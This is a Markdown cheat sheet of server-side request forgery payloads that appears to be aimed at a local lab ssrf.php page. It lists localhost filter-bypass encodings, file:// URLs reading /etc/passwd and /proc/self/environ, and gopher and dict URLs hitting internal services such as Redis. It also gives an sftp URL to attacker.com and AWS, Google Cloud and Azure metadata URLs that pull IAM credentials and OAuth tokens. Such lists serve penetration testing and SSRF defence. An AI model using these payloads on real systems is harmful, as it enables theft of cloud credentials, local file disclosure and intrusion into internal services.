# Server-Side Request Forgery (SSRF) Payloads

## Localhost Variants (Bypass Filters)

| Type | Payloads |
| :--- | :--- |
| **Standard** | `http://127.0.0.1:80`<br>`http://localhost:80`<br>`https://127.0.0.1:443`<br>`https://localhost:443` |
| **IPv6** | `http://[::]:80`<br>`http://0000::1:80`<br>`http://[0:0:0:0:0:ffff:127.0.0.1]` |
| **Shortened** | `http://127.1`<br>`http://127.0.1`<br>`http://0/` |
| **Decimal** (127.0.0.1) | `http://2130706433`<br>`http://017700000001` (octal) |

## File Protocol (Local File Disclosure)

- `file:///etc/passwd`
- `file:///c:/windows/win.ini`
- `file://path/to/config`
- `file:///etc/passwd` (`# Double slash bypass`)
- `file:///proc/self/environ` (`# Environment variables`)
- `file:///proc/version` (`# Kernel info`)

## Alternative Protocols (Protocol Bypass)

| Protocol | Example |
| :--- | :--- |
| **SFTP** | `sftp://attacker.com:22/` |
| **TFTP** | `tftp://192.168.1.1:69/` |
| **LDAP** | `ldap://localhost:389/` |
| **GOPHER** | `gopher://127.0.0.1:80/_GET%20/ HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a` |
| **DICT** | `dict://127.0.0.1:11211/` |

---

## AWS Metadata Service (IMDSv1)

- `http://169.254.169.254/latest/meta-data/`
- `http://169.254.169.254/latest/meta-data/ami-id`
- `http://169.254.169.254/latest/meta-data/hostname`
- `http://169.254.169.254/latest/meta-data/public-keys/`
- `http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key`
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]`
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance`
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access`
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy`

---

## Google Cloud Metadata

- `http://169.254.169.254/computeMetadata/v1/`
- `http://metadata.google.internal/computeMetadata/v1/`
- `http://metadata/computeMetadata/v1/`
- `http://metadata.google.internal/computeMetadata/v1/instance/id`
- `http://metadata.google.internal/computeMetadata/v1/instance/hostname`
- `http://metadata.google.internal/computeMetadata/v1/project/project-id`
- `http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id`

**Requires** `Metadata-Flavor: Google` **header**

## Azure Instance Metadata Service (IMDS)

- `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- `http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01`
- `http://169.254.169.254/metadata/instance/network?api-version=2021-02-01`
- `http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01&format=text`
- `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`

**Requires** `Metadata: true` **header**

---

## Usage in ssrf.php Context

- **Test these in your ssrf.php:**

      http://192.168.1.45/ssrf.php?img_url=http://127.0.0.1:22

      http://192.168.1.45/ssrf.php?img_url=file:///etc/passwd

      http://192.168.1.45/ssrf.php?img_url=http://169.254.169.254/latest/meta-data/

      http://192.168.1.45/ssrf.php?img_url=gopher://127.0.0.1:6379/_INFO

## Filter Bypass Techniques

- **URL encoding**

  `%68%74%74%70://127.0.0.1`

- **@ bypass**

  `http://expected.com@127.0.0.1`

- **Fragment bypass**

  `http://127.0.0.1#expected.com`

- **Case variations**

  `HtTp://127.0.0.1`

  `hTTp://localhost`
